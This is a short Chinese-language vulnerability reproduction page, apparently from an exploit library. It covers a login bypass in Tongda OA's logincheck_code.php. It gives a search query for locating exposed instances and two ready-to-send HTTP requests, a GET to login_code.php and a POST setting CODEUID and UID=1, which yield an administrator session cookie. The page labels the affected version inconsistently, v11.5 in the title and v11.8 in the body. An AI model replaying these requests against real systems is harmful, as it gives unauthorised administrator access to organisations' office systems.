# 通达OA v11.5 logincheck_code.php 登陆绕过漏洞

## 漏洞描述

通达OA v11.8 logincheck_code.php存在登陆绕过漏洞，通过漏洞攻击者可以登陆系统管理员后台

## 漏洞影响

<a-checkbox checked>通达OA v11.8</a-checkbox></br>

## 网络测绘

<a-checkbox checked>app="TDXK-通达OA" </a-checkbox></br>

## 漏洞复现

登陆页面

![img](../../../.vuepress/public/img/1628306796311-4c49ac12-0e18-44ef-a0c2-c6a2d7d0f20a.png)

发送第一个请求包

```php
GET /general/login_code.php HTTP/1.1
Host: 
User-Agent: Go-http-client/1.1
Accept-Encoding: gzip
```

![img](../../../.vuepress/public/img/1628306860352-5e9f9343-742d-4697-abe8-7e5c2534722d.png)

再发送第二个恶意请求

```php
POST /logincheck_code.php HTTP/1.1
Host: 
User-Agent: Go-http-client/1.1
Content-Length: 56
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

CODEUID=%7BD384F12E-A758-F44F-8A37-20E2568306A7%7D&UID=1
```

![img](../../../.vuepress/public/img/1628306918632-bb9e22e6-79b6-4fe1-8839-729fc9b6abe5.png)

获取cookie后访问管理员页面 `/general/index.php`

![img](../../../.vuepress/public/img/1628307007812-02e45309-32af-4513-a89c-00aa30fb9366.png)